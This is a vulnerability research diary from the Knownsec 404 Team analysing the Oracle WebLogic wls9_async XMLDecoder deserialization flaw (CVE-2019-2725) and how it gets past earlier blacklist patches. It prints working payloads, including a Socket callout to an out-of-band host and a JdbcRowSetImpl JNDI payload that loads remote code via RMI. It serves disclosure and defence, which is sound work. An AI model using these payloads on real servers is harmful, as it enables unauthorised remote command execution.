**Author: Badcode@Knownsec 404 Team**  
**Chinese version:<https://paper.seebug.org/909/>**

### 17 April

On April 17, 2019, CNVD released the security bulletin, tracked as
[CNVD-C-2019-48814](http://www.cnvd.org.cn/webinfo/show/4989). The bulletin
pointed out that the `wls9_async_response.war` package included in some
versions of WebLogic by default provides asynchronous communication for
WebLogic Server service. Because the WAR package is flawed when deserializing
input information, an attacker can send a constructed malicious HTTP request
to gain the permissions of the target server and execute the command remotely
without authorization.

### 18 April

On April 18, 2019, I started researching this vulnerability. Because this
vulnerability was 0day at the time, there is no patch for reference, only the
announcement content. I started with `wls9_async_response.war` package
mentioned in the announcement, and take a look at the url in `web.xml` first.

![](https://images.seebug.org/content/images/2019/05/01/1556689395000-1.png-w331s)

I tryed to access it when I saw `/AsyncResponseService` but it returned 404.
Then I noticed `weblogic.xml` and `weblogic-webservices.xml`

![](https://images.seebug.org/content/images/2019/05/01/1556689395000-2.png-w331s)

Access `_async/AsyncResponseService`

![](https://images.seebug.org/content/images/2019/05/01/1556689395000-3.png-w331s)

It can be accessed, combined with the announcement of the vulnerability
recommendations, I guess the trigger point of this vulnerability is right
here.

See `weblogic.wsee.async.AsyncResponseBean` class in `weblogic-webservices.xml`, view this class and find it in `wseeclient.jar`

![](https://images.seebug.org/content/images/2019/05/01/1556689395000-4.png-w331s)

Then I breakpoints under the methods in this class, and then construct a
normal SOAP message and send it.

![](https://images.seebug.org/content/images/2019/05/01/1556689396000-5.png-w331s)

There is no debug to the breakpoint. Finally, I put all the methods of all
classes in `wsee/async` with breakpoints, resend the message, and successfully
intercepted the `handleRequest` in the `AsyncResponseHandler` class.

![](https://images.seebug.org/content/images/2019/05/01/1556689396000-6.png-w331s)

See the `string var2 =
(String)var1.getProperty("weblogic.wsee.addressing.RelatesTo")` in the image;
this step never gets the value, causing the process to end. In order to solve
this problem, I have turned a lot of information, and finally found a similar
example, you can use `<ads:RelatesTo>test</ads:RelatesTo>` to assign value to
`weblogic.wsee.addressing.RelatesTo`.

    
    
    <?xml version="1.0" encoding="UTF-8" ?>
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:ads="http://www.w3.org/2005/08/addressing">
      <soapenv:Header>
        <ads:Action>demo</ads:Action>
        <ads:RelatesTo>test</ads:RelatesTo>
    </soapenv:Header>
      <soapenv:Body></soapenv:Body>
    </soapenv:Envelope>

![](https://images.seebug.org/content/images/2019/05/01/1556689396000-7.png-w331s)

The following process is wrong, so I'm not gonna write it here.

### 19 April

On April 19, 2019, My partner sent me a screenshot.

![](https://images.seebug.org/content/images/2019/05/01/1556689396000-8.png-w331s)

Search the `UnitOfWorkChangeSet` class globally and then breakpoints in this
class.

According to the screenshot, construct a similar HTTP request and then send it

![](https://images.seebug.org/content/images/2019/05/01/1556689396000-9.png-w331s)

Now it can be debugged in the `UnitOfWorkChangeSet` class

![](https://images.seebug.org/content/images/2019/05/01/1556689396000-10.png-w331s)

I saw the `readObject` method and tried to use the gadget in ysoserial.
Currently, the `commoncollections` related to WebLogic are unusable. The
version of `common-collections` that WebLoigc relies on has been upgraded.
First, find a `Jdk7u21` gadget to test it and convert the generated payload
into byte type.

![](https://images.seebug.org/content/images/2019/05/01/1556689396000-11.png-w331s)

As you can see, the command was successfully executed. But this gadget has too
many restrictions. I think of a WebLogic deserialize rce vulnerability last
year, CVE-2018-3191. Since jdk7u21 is not restricted by WebLogic blacklists,
CVE-2018-3191 should be the same.

![](https://images.seebug.org/content/images/2019/05/01/1556689397000-12.png-w331s)

As you can see, CVE-2018-3191 is also available. Discuss with
[@pyn3rd](https://twitter.com/pyn3rd) whether there are other gadgets, look at
the blacklist carefully, except CVE-2018-3191, only the new jython gadget
(CVE-2019-2645), submitted by [@Matthias
Kaiser](https://twitter.com/matthias_kaiser), but this has no details, so no
way to use it.

Go back to the `handleRequest` method in the `AsyncResponseHandler` class and
see the previous step of the `handleRequest`, the `handleRequest` method in
the `HandlerIterator` class.

    
    
        public boolean handleRequest(MessageContext var1, int var2) {
            this.closureEnabled = false;
            this.status = 1;
            WlMessageContext var3 = WlMessageContext.narrow(var1);
            if (verboseHistory) {
                updateHandlerHistory("...REQUEST...", var3);
            }
    
            for(this.index = var2; this.index < this.handlers.size(); ++this.index) {
                Handler var4 = this.handlers.get(this.index);
                if (verbose) {
                    Verbose.log("Processing " + var4.getClass().getSimpleName() + "...  ");
                }
    
                if (verboseHistory) {
                    updateHandlerHistory(var4.getClass().getSimpleName(), var3);
                }
    
                HandlerStats var5 = this.handlers.getStats(this.index);
    
                try {
                    var3.setProperty("weblogic.wsee.handler.index", new Integer(this.index));
                    String var6;
                    if (!var4.handleRequest(var3)) {
                        if (verboseHistory) {
                            var6 = var4.getClass().getSimpleName() + ".handleRequest=false";
                            updateHandlerHistory(var6, var3);
                        }
    
                        if (var5 != null) {
                            var5.reportRequestTermination();
                        }
    
                        return false;
                    }

The `handleReques`t method iterates through `this.handlers` and then calls
each handler's `handleRequest` to handle the SOAP Message.

![](https://images.seebug.org/content/images/2019/05/01/1556689397000-14.png-w331s)

`AsyncResponseHandler` is only one of 21 handler, and `webLogic.
wsee.addressing.relatesto` is assigned in `ServerAddressingHandler`, and those
who are interested can follow it. There is a very important
handler--`WorkAreaServerHandler`.

![](https://images.seebug.org/content/images/2019/05/01/1556689397000-15.png-w331s)

The following process is the same as CVE-2017-10271. For an analysis of this
vulnerability, see the [@xxlegend](https://twitter.com/shengqi158)'s
[article](https://paper.seebug.org/487/).

![](https://images.seebug.org/content/images/2019/05/01/1556689397000-16.png-w331s)

As you can see here, this url is just another trigger point for the
CVE-2017-10271 vulnerability. This is also a reason for the late lead to false
PoC. The whole process is probably as follows:

![](https://images.seebug.org/content/images/2019/05/01/1556689397000-25.png-w331s)

How does this PoC bypass the blacklist of CVE-2017-10271?

First look at the CVE-2017-10271 patch, the data will be checked by the
validate method, and then passed to the `XMLDecoder`.

    
    
    public WorkContextXmlInputAdapter(InputStream var1) {
            ByteArrayOutputStream var2 = new ByteArrayOutputStream();
    
            try {
                boolean var3 = false;
    
                for(int var5 = var1.read(); var5 != -1; var5 = var1.read()) {
                    var2.write(var5);
                }
            } catch (Exception var4) {
                throw new IllegalStateException("Failed to get data from input stream", var4);
            }
    
            this.validate(new ByteArrayInputStream(var2.toByteArray()));
            this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(var2.toByteArray()));
        }
    
        private void validate(InputStream var1) {
            WebLogicSAXParserFactory var2 = new WebLogicSAXParserFactory();
    
            try {
                SAXParser var3 = var2.newSAXParser();
                var3.parse(var1, new DefaultHandler() {
                    private int overallarraylength = 0;
    
                    public void startElement(String var1, String var2, String var3, Attributes var4) throws SAXException {
                        if (var3.equalsIgnoreCase("object")) {
                            throw new IllegalStateException("Invalid element qName:object");
                        } else if (var3.equalsIgnoreCase("new")) {
                            throw new IllegalStateException("Invalid element qName:new");
                        } else if (var3.equalsIgnoreCase("method")) {
                            throw new IllegalStateException("Invalid element qName:method");
                        } else {
                            if (var3.equalsIgnoreCase("void")) {
                                for(int var5 = 0; var5 < var4.getLength(); ++var5) {
                                    if (!"index".equalsIgnoreCase(var4.getQName(var5))) {
                                        throw new IllegalStateException("Invalid attribute for element void:" + var4.getQName(var5));
                                    }
                                }
                            }
    
                            if (var3.equalsIgnoreCase("array")) {
                                String var9 = var4.getValue("class");
                                if (var9 != null && !var9.equalsIgnoreCase("byte")) {
                                    throw new IllegalStateException("The value of class attribute is not valid for array element.");
                                }
    
                                String var6 = var4.getValue("length");
                                if (var6 != null) {
                                    try {
                                        int var7 = Integer.valueOf(var6);
                                        if (var7 >= WorkContextXmlInputAdapter.MAXARRAYLENGTH) {
                                            throw new IllegalStateException("Exceed array length limitation");
                                        }
    
                                        this.overallarraylength += var7;
                                        if (this.overallarraylength >= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) {
                                            throw new IllegalStateException("Exceed over all array limitation.");
                                        }
                                    } catch (NumberFormatException var8) {
                                        ;
                                    }

It can be seen that the tags of `object`, `new`, and `method` are all
filtered. The `void` tag can only be followed by `index`, and the `array` tag
can be followed by the `class` attribute, but the type can only be of type
`byte`. Among them, the filtering `object` tag is a patch of CVE-2017-3506,
and the remaining filtering is a patch for CVE-2017-10271.

The key to bypassing this blacklist is the `class tag`, which can be found in
the official
[documentation](https://docs.oracle.com/javase/tutorial/javabeans/advanced/longpersistence.html).

![](https://images.seebug.org/content/images/2019/05/01/1556689397000-17.png-w331s)

The `class` tag can represent an instance of a class, which means that you can
use the class tag to create an instance of any class. The `class` tag is not
in the blacklist of WebLogic, which is the reason for this vulnerability. On
April 26, Oracle released a patch for this vulnerability, and filtering the
`class` tag also confirmed this.

![](https://images.seebug.org/content/images/2019/05/01/1556689397000-26-1.png-w331s)

Since the reason for the vulnerability is to bypass the blacklist of
CVE-2017-10271, then `wls-wsat.war` should also be affected.

Test it.

![](https://images.seebug.org/content/images/2019/05/01/1556689397000-18.png-w331s)

### 21 April

On April 21, 2019, I was going to construct a detection PoC for this
vulnerability. I could use the `class` tag to create an instance of the
`java.net.Socket` class. My jdk version is jdk 6u45.

    
    
    <java>
        <class>
            <string>java.net.Socket</string>
            <void>
                <string>aaaaabbbbbbbbbbb.wfanwb.ceye.io</string>
                <int>80</int>
            </void>
        </class>
    </java>

[Ceye](http://ceye.io/) successfully received the request, which also
indicates that the Socket instance was created successfully.

![](https://images.seebug.org/content/images/2019/05/01/1556689398000-19.png-w331s)

I tested the above PoC on jdk 7, but it failed. The program prompted
java.net.Socket nof found error, which made me think that this vulnerability
could only be triggered under jdk 6. After careful comparison, it was found to
be a newline character problem. The correct PoC should be like this

    
    
    <java><class><string>java.net.Socket</string><void><string>aaaaabbbbbbbbbbb.wfanwb.ceye.io</string><int>80</int></void></class></java>

### 22 April

On April 22, 2019, @pyn3rd failed to test WebLogic 12.1.3. He found that the
version 12 did not have the
`oracle.toplink.internal.sessions.UnitOfWorkChangeSet` class, so there was no
way to use it. So I tried to construct a new exp. The current situation is
that I can create an instance of the class, but I can't call the method. I
think of `com.sun.rowset.JdbcRowSetImpl` class.

    
    
    <java version="1.8.0_131" class="java.beans.XMLDecoder">
        <void class="com.sun.rowset.JdbcRowSetImpl">
        <void property="dataSourceName">
            <string>rmi://localhost:1099/Exploit</string>
        </void>
        <void property="autoCommit">
            <boolean>true</boolean>
        </void>
        </void>
    </java>

This is one of the CVE-2017-10271 payloads. The previous blacklist mentioned
that the `void` tag can only be followed by index, so the above payload will
definitely be rejected by the blacklist. Try to rewrite the above payload
using the `class` tag.

In the process, I found that jdk 6 and jdk 7 handle tags differently.

Jdk 6 uses`com.sun.beans.ObjectHandler`

![
](https://images.seebug.org/content/images/2019/05/43f5d754-fd8c-4de7-b692-defe57ef3161.png-w331s)

Available tags are `string`, `class`, `null`, `void`, `array`, `java`,
`object` and some primive tags (like `int`).

Jdk7 uses`com.sun.beans.decoder.DocumentHandler`

![
](https://images.seebug.org/content/images/2019/05/fe3f5815-840e-42ab-a862-16ea6b64c83f.png-w331s)

As you can see, there are some differences compared with jdk6. For example,
jdk 6 does not support tags such as `new` and `property` .

When I used the jdk 6 tag to construct exp, I did not succeed until I saw the
`property` tag in the source code of jdk 7, I found what I wanted, and this
tag is not in the WebLogic blacklist. So you can override the previous payload
with the `property` tag.

![](https://images.seebug.org/content/images/2019/05/01/1556688746000-22-1.png-w331s)

Successfully executed the command and both 10.3.6 and 12.1.3 can be used.
Unfortunately, this payload cannot be used in jdk 6 because jdk 6 does not
support the `property` tag.

### 23 April

On April 23, 2019, After major security companies issued a vulnerability
alert, many fake PoCs that could not bypass the patch appeared. Many people
said that the test was successful, but they were all tested without patches.
Oracle's downloaded WebLogic is not patched, Oracle's patch is a separate
charge, if you install the CVE-2017-10271's patch,these PoC and exp cannot
bypass the blacklist.

![](https://images.seebug.org/content/images/2019/05/01/1556689398000-23.png-w331s)

### 26 April

On April 26, 2019, Oracle officially released an emergency patch and this
vulnerability has been identified as **CVE-2019-2725**.

### 27 April

On April 27, 2019, @pyn3rd said that the exp of the WebLogic 12.1.3 was also
researched, using `org.slf4j.ext.EventData`

    
    
        public EventData(String xml) {
            ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());
    
            try {
                XMLDecoder decoder = new XMLDecoder(bais);
                this.eventData = (Map)decoder.readObject();
            } catch (Exception var4) {
                throw new EventException("Error decoding " + xml, var4);
            }
        }

Looking at the construction method of this class, if I can construct an
instance of this class, I can call `XMLDecoder.readObject` again, and the
second time I call this, will not be checked by the blacklist.

![](https://images.seebug.org/content/images/2019/05/01/1556689398000-24-1.png-w331s)

### 30 April

On April 30, 2019, I saw other uses of this vulnerability without the version
restrictions of weblogic and jdk. This exploitation I have seen before, is the
[demo video](https://www.youtube.com/watch?v=lePLlC1hFrU&feature=youtu.be)
sent by Tenable. I didn't understand it at the time. After I saw the exploit
method, I realized what I ignored. This exploitation can refer to
CVE-2017-17485 vulnerability.

![](https://images.seebug.org/content/images/2019/05/01/1556689398000-27.png-w331s)

### summary

For this vulnerability, Oracle issued [a rare out-of-band security
update](https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html) to address this vulnerability, and still uses the
blacklist to fix it. In the process of researching this vulnerability, I also
learned a lot of new tips.

### Reference

  * [关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告](http://www.cnvd.org.cn/webinfo/show/4989)
  * [Weblogic XMLDecoder RCE分析](https://paper.seebug.org/487/)
  * [Oracle Security Alert Advisory - CVE-2019-2725](https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html)
  * [[KnownSec 404 Team] Oracle WebLogic Deserialization RCE Vulnerability (0day) Alert](https://medium.com/@knownseczoomeye/knownsec-404-team-oracle-weblogic-deserialization-rce-vulnerability-0day-alert-90dd9a79ae93)
  * [WebLogic Unauthenticated Remote Code Execution Vulnerability (CVE-2019-2725) with Pocsuite3](https://www.youtube.com/watch?v=NtjC7cheNd8&feature=youtu.be)

## About Knownsec & 404 Team

Beijing Knownsec Information Technology Co., Ltd. was established by a group
of high-profile international security experts. It has over a hundred frontier
security talents nationwide as the core security research team to provide
long-term internationally advanced network security solutions for the
government and enterprises.

Knownsec's specialties include network attack and defense integrated
technologies and product R&D under new situations. It provides visualization
solutions that meet the world-class security technology standards and enhances
the security monitoring, alarm and defense abilities of customer networks with
its industry-leading capabilities in cloud computing and big data processing.
The company's technical strength is strongly recognized by the State Ministry
of Public Security, the Central Government Procurement Center, the Ministry of
Industry and Information Technology (MIIT), China National Vulnerability
Database of Information Security (CNNVD), the Central Bank, the Hong Kong
Jockey Club, Microsoft, Zhejiang Satellite TV and other well-known clients.

404 Team, the core security team of Knownsec, is dedicated to the research of
security vulnerability and offensive and defensive technology in the fields of
Web, IoT, industrial control, blockchain, etc. 404 team has submitted
vulnerability research to many well-known vendors such as Microsoft, Apple,
Adobe, Tencent, Alibaba, Baidu, etc. And has received a high reputation in the
industry.

The most well-known sharing of Knownsec 404 Team includes: [KCon Hacking
Conference](http://kcon.knownsec.com/ "KCon Hacking Conference"), [Seebug
Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability
Database") and [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/
"ZoomEye Cyberspace Search Engine").

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/910/>

